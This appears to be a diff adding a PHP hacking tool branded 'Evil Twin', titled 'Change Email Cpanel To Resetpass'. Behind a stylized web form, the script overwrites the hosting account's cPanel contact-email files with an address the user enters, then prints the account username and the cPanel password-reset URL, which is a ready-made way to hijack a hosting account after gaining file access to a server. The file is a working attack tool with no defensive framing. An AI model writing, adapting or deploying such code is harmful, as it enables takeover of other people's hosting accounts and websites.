@@ -1,0 +1,59 @@
+<?php
+echo '<html>
+<head> 
+<link rel="shortcut icon" href="https://i.ibb.co/M8hrCfz/20200415-072352.png">
+<title>Change Email Cpanel To Resetpass</title>
+<link href="https://fonts.googleapis.com/css?family=Metal+Mania&display=swap" rel="stylesheet">
+<meta property="og:description" content="• Evil Twin •">
+<meta property="og:image" content="https://i.ibb.co/M8hrCfz/20200415-072352.png">
+<style>body {background-color:black;color:white;font-family:"Metal Mania", cursive;text-align:center;}h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px; padding:0px; animation:eviltwin 0.5s linear infinite;} @keyframes eviltwin{2%{color:#fff;}3%{transform:translate(2px,-10px) skewX(3240deg);}5%{transform:translate(0px,0px) skewX(0deg);}2% , 54%{transform:translateX(0px) skew(0deg);}55%{transform:translate(-2px,6px) skew(-5530deg);}56%{transform:translate(0px,0px) skew(0deg);}57%{transform:translate(4px,-10px) skew(-70deg);}58%{transform:translate(0px,0px) skew(0deg);}62%{transform:translate(0px,20px) skew(0deg);}63%{transform:translate(4px,-2px) skew(0deg);}90%{transform:translate(1px,3px); skew(-230deg);}95%{transform:translate(-7px,2px); skew(-120deg);}100%{transform:translate(0px,0px) skew(0deg);}
+input[type="email"] {
+  width: 40%;
+  padding: 8px 16px;
+  margin: 6px 0;
+  box-sizing: border-box;
+  border: none;
+  border-bottom: 2px solid red;
+}
+input[type="email"]:focus {
+  width: 40%;
+  padding: 8px 16px;
+  margin: 6px 0;
+  box-sizing: border-box;
+  border: none;
+  border-bottom: 2px solid red;
+}
+</style>
+<body onload="type_text()" alink="#ffffff" vlink="#ffffff" link="#ffffff" text="#ffffff">
+<table height=100% width=100%>
+<td align=center>
+</head>
+<h1><img src="https://i.ibb.co/M8hrCfz/20200415-072352.png" width="200" border="0" alt="Evil Twin"></h1>
+<body>
+<center>
+<font color="white" size="6">Evil Twin Change Email Cpanel</font><br><br>
+<form action="#" method="post">
+<input type="email" placeholder="your email" name="email" style="width: 31%;padding: 5px 10px;margin: 3px 0;box-sizing: border-box;border: none;border-bottom: 5px solid grey;"/>
+<input type="submit" name="submit" value="change" style="background:blacklight;color:black;border-top:0;border-left:0;border-right:0;border-bottom:5px solid grey;padding:5px 10px;text-decoration:none;font-family:sans-serif;font-size:11pt;"><br><br>
+<font color="white" size="4">© 2020 | Evil Twin</font>
+</form>
+</div>
+</center>
+</body>
+</html>';
+$user = get_current_user();
+$site = $_SERVER['HTTP_HOST'];
+$ips = getenv('REMOTE_ADDR');
+if(isset($_POST['submit'])){
+$email = $_POST['email'];
+$wr = 'email:'.$email;
+$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
+fwrite($f, $wr); 
+fclose($f);
+$f = fopen('/home/'.$user.'/.contactinfo', 'w');
+fwrite($f, $wr); 
+fclose($f);
+$parm = $site.':2083/resetpass?start=1';
+echo '<br/><center>username : '.$user.' | login on : '.$parm.'</center>';
+}
+?>
